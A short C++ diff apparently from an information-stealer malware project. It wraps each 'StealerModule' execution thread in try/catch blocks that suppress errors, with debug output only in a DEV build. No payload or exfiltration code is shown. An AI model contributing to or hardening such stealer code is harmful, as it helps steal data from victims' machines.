@@ -16,7 +16,17 @@ protected:
 
         for(StealerModule* module : this->modules) {
             threads.emplace_back([module, &modules_root]() {
-                module->execute(modules_root);
+                try
+                {
+                    module->execute(modules_root);
+                }
+                catch (const std::exception& e)
+                {
+                    #if DEV
+                        std::cerr << "DEBUG ERROR: " << e.what() << std::endl;
+                    #endif
+                }
+                catch (...){}
             });
         }
 
